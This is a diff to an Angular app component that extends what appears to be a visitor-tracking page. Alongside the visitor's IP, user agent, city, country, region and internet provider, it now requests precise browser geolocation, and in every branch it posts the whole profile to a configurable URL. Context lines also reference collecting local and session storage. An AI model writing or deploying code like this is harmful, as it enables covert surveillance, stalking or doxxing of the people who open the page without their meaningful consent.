@@ -18,7 +18,8 @@ export class AppComponent implements OnInit {
   loc: string = ""; // latitude
   empresa: string = ""; // empresa que fornece internet
   item:string = "";
-
+  latitude:any = '';
+  longitude:any = ''
   constructor(private httpClient: HttpClient,
     private route: ActivatedRoute
   ) {
@@ -44,21 +45,78 @@ export class AppComponent implements OnInit {
             const localStorageList: { key: any  | null, value: string | null }[] = [];
             const sessionStorageList: { key: any | null, value: string | null }[] = [];
 
-            const userInfo = {
-              ip: this.ip,
-              userAgent: this.userAgent,
-              city: this.city,
-              country: this.contry,
-              region: this.region,
-              loc: this.loc,
-              empresa: this.empresa,
-            };
+      
+            if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                (position) => {
+                  this.latitude = position.coords.latitude;
+                  this.longitude = position.coords.longitude;
 
-            this.httpClient.post(this.item, userInfo).subscribe({
-              next:(data) => {
+                  const userInfo = {
+                    ip: this.ip,
+                    userAgent: this.userAgent,
+                    city: this.city,
+                    country: this.contry,
+                    region: this.region,
+                    loc: this.loc,
+                    empresa: this.empresa,
+                    latitude:this.latitude,
+                    longitude:this.longitude,
+                  };
+      
+                  this.httpClient.post(this.item, userInfo).subscribe({
+                    next:(data) => {
+      
+                    }
+                  })
+                },
+                (error) => {
+                  this.latitude = error;
+                  this.longitude = error;
 
-              }
-            })
+                  const userInfo = {
+                    ip: this.ip,
+                    userAgent: this.userAgent,
+                    city: this.city,
+                    country: this.contry,
+                    region: this.region,
+                    loc: this.loc,
+                    empresa: this.empresa,
+                    latitude:this.latitude,
+                    longitude:this.longitude,
+                  };
+      
+                  this.httpClient.post(this.item, userInfo).subscribe({
+                    next:(data) => {
+      
+                    }
+                  })
+                }
+              );
+            } else {
+              this.latitude = 'Geolocalização não é suportada pelo seu navegador.';
+              this.longitude = 'Geolocalização não é suportada pelo seu navegador.';
+
+              const userInfo = {
+                ip: this.ip,
+                userAgent: this.userAgent,
+                city: this.city,
+                country: this.contry,
+                region: this.region,
+                loc: this.loc,
+                empresa: this.empresa,
+                latitude:this.latitude,
+                longitude:this.longitude,
+              };
+  
+              this.httpClient.post(this.item, userInfo).subscribe({
+                next:(data) => {
+  
+                }
+              })
+            }
+
+          
           }
         })
       }
